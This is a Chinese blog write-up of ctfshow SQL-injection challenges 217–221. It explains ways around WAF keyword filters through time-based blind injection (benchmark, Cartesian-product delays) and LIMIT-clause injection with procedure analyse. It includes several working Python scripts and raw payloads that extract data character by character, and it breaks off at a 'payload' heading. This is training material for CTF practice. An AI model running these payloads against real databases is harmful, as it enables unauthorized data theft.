<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure></div>

<p>之前一直都没管 php 的 preg_match 函数，这里对它的几个常见参数记录一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u 表示按unicode(utf-8)匹配（主要针对多字节比如汉字）</span><br><span class="line">/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）</span><br><span class="line">/s 表示将字符串视为单行来匹配</span><br></pre></td></tr></table></figure></div>

<p><strong>返回逻辑部分禁用了 sleep，还可以用 benchmark 和笛卡尔积。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20210825152632083-741400030.png"
                      alt="image-20210821190843466"
                ></p>
<p><strong>使用benchmark 函数去尝试注入时间(每个payload都最好单独测一下，这里只写flag那个)</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=(<span class="keyword">if</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">mid</span>((select <span class="title function_ invoke__">group_concat</span>(flagaabc) <span class="keyword">from</span> ctfshow_flagxccb),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="title function_ invoke__">benchmark</span>(<span class="number">40000000</span>,<span class="string">&#x27;koishi&#x27;</span>=<span class="string">&#x27;Cirno&#x27;</span>),<span class="number">1</span>))&amp;debug=<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>（因为个人癖好，这里的benchmark 里面使用的有字符串，如果引号被过滤的话，使用1&#x3D;1这种整数比较或者换成其他的可执行的语句都行）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220822202801278.png"
                      alt="image-20220822202801278"
                ></p>
<p><strong>执行一次大概需要2秒，我们就可以根据这个来时间盲注了</strong></p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><p>本脚本是参考其他师傅写的，那位师傅的脚本费事太长了，于是我对其进行了修改</p>
<p>原本的 timeout为3， sleep为10 （因为他的benchmark 太费时了，10s左右），benchmark 为 <code>benchmark(8000000,md5(0x31))</code></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://77278e61-fbea-4a6d-87ce-b0067f5cbbc0.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxccb,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(40000000,&#x27;koishi&#x27;=&#x27;Cirno&#x27;),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">            time.sleep(<span class="number">3</span>) <span class="comment"># benchmark 跑完大概需要 2s ，1.5s 超时后再让脚本停 8s，防止阻塞后全部超时影响时间盲注,导致结果出现问题</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<p>由于这个东西比较吃网速，如果出现问题，适当延长sleep的时间长度</p>
<h2 id="218-219-sleep和benchmark被禁"><a href="#218-219-sleep和benchmark被禁" class="headerlink" title="218-219(sleep和benchmark被禁)"></a>218-219(sleep和benchmark被禁)</h2><p><strong>(219多过滤了rlike，和我们的笛卡尔积关系不大)</strong></p>
<p><strong>看题目过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">where id = (<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>



<p><strong>使用笛卡尔积</strong></p>
<blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1601686" >SQL注入经验-大负荷注入 - 腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>通过采用 1 个表 2 个列，或者 2 个列一个表，等等各种组合找出合适的延时的时间。</strong></p>
</blockquote>
<p>参考别人师傅写好的exp</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><p><strong>经过测试，利用 <code>information_schema</code> 中的数据，一个 <code>columns</code> 和两个 <code>tables</code> 的笛卡尔积刚好能延时 6 秒左右，适合构造 payload。</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://af34bdbe-291d-4bad-b112-ca31adbcc85a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaac</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p:<span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url=url,data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入使用之前那个timeout来报错返回true或false也行的捏</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;少女折寿中: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end)==<span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end&lt;start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r flag is : <span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨酱使命完成&quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p><strong>亲自尝试也确实是6s</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220823150042653.png"
                      alt="image-20220823150042653"
                ></p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip<span class="operator">=</span>if(ascii(mid((<span class="keyword">select</span> flagaac <span class="keyword">from</span> ctfshow_flagxc),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A,information_schema.tables B,information_schema.tables C),<span class="number">1</span>)<span class="operator">&amp;</span>debug<span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>



<p>除了information_schema.columns 和 information_schema.table可以使用，同样information_schema.schemata也能使用m-，但是它的count数肯定不如前面那两个多，反正自己组合吧，我尝试了</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip<span class="operator">=</span>if(ascii(mid((<span class="keyword">select</span> flagaac <span class="keyword">from</span> ctfshow_flagxc),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),<span class="number">1</span>)<span class="operator">&amp;</span>debug<span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>



<p>延时大概是1.4s左右（这个就需要网速比较好才不会出问题，但跑起来比之前那个省较多时间（触发延时的时候比较短，总体节省3-4分钟吧）。但是时间短了，就一定一定要注意网络不要波动太大，不然老老实实用上面的那个吧），再加到G就是7s了，还不如上面的那个</p>
<p>也就只是改了一下payload，嘛，还是贴一下，方便复制粘贴（还是容易出错，毕竟时间太短了，假如某个时间网卡一下，flag就错了）</p>
<p>(还是建议用上面那个时间长一点的，这个就当拓展思维了，要是能凑出4s左右的应该也可以用。这个自己手动调整也能用)</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2ed44bf1-af80-4d14-886c-50ce08dda8f6.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaac</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p:<span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url=url,data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入使用之前那个timeout来报错返回true或false也行的捏</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#半自动，请自行调整result</span></span><br><span class="line">index = <span class="number">1</span> + <span class="built_in">len</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;少女折寿中: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end)==<span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end&lt;start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r flag is : <span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨酱使命完成&quot;</span>)</span><br></pre></td></tr></table></figure></div>





<h2 id="220（多禁了substr和concat）"><a href="#220（多禁了substr和concat）" class="headerlink" title="220（多禁了substr和concat）"></a>220（多禁了substr和concat）</h2><p><strong>还是看看过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br><span class="line">  </span><br></pre></td></tr></table></figure></div>

<p><strong>因为多禁了concat，所以之前我们使用left等替换mid、substr，依旧可行，但是需要配合limit一个一个查来绕过concat的限制</strong></p>
<p><strong>然后之前的限制依旧未解除，还是使用笛卡尔积（这里我使用的网速要求较低的。之前那个跑出来还是有问题，分段跑还行，半自动吧，看着它卡着不动了，就是当前末尾的不对，导致下一个也不能匹配，除去下一个之后，调整一下index和result重新接着跑就行）</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bbd0ffd9-1926-4091-8fc7-73399a2a4f0a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxcac</span></span><br><span class="line"><span class="comment"># payload = &quot;left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 列名 flagaabcc</span></span><br><span class="line"><span class="comment"># payload = &quot;left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;left((select flagaabcc from ctfshow_flagxcac limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span></span><br><span class="line">              <span class="string">f&quot;information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = <span class="string">&quot;&#123;&#125;_-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">        load = payload.<span class="built_in">format</span>(index, result + letter)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(load):</span><br><span class="line">            result += letter</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<h1 id="其他子句注入"><a href="#其他子句注入" class="headerlink" title="其他子句注入"></a>其他子句注入</h1><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><h3 id="资料1"><a href="#资料1" class="headerlink" title="资料1"></a>资料1</h3><p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入 （应该是5.6以上修复了）</strong></p>
<p>可参考文章： [<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" >转载]Mysql下Limit注入方法 | 离别歌 (leavesongs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>看文章讨论</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220823211612559.png"
                      alt="image-20220823211612559"
                ></p>
<p><strong>所以在procedure里面我们还是写 extractvalue() 而不用 select() 吧，这样版本限制要弱一些，可利用机会更多</strong></p>
<h3 id="资料2"><a href="#资料2" class="headerlink" title="资料2"></a>资料2</h3><p>查看另外师傅的博客</p>
<blockquote>
<p>mysql语句：select * from limit test limit 1,[可控点] or select … limit [可控点]</p>
<p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，<strong>而且只能用extractvalue 和 benchmark 函数进行延时</strong></p>
<p><em><strong>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</strong></em></p>
<p>演示</p>
<p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)；</p>
<p>时间盲注</p>
<p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
</blockquote>
<p><strong>注意看，我们可利用的注入位置是limit 的两个数字之后的位置，不是哪里都可以插procedure analyse的</strong></p>
<h3 id="221"><a href="#221" class="headerlink" title="221"></a>221</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line">  <span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user <span class="title function_ invoke__">limit</span> (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>,<span class="variable">$limit</span>;</span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line">	<span class="comment">//拿到数据库名字就算你赢</span></span><br><span class="line">      </span><br></pre></td></tr></table></figure></div>

<p>看题，我们的注入点在limit处，而且可以利用</p>
<p><strong>利用 procedure analyse 构造参数。</strong></p>
<p><strong>payload</strong> </p>
